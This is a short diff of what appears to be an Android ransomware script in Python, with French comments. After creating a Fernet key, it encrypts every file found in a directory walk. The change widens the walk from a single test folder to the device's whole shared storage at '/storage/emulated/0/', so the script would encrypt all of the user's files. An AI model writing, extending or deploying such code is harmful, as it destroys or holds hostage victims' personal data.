@@ -51,7 +51,7 @@ except Exception as e:
 fn = Fernet(key)
 
 # Chiffrement des fichiers
-for path, dirs, files in os.walk("/storage/emulated/0/ShadowWave/jael"):
+for path, dirs, files in os.walk("/storage/emulated/0/"):
     for f in files:
         chiffrer(os.path.join(path, f))
 
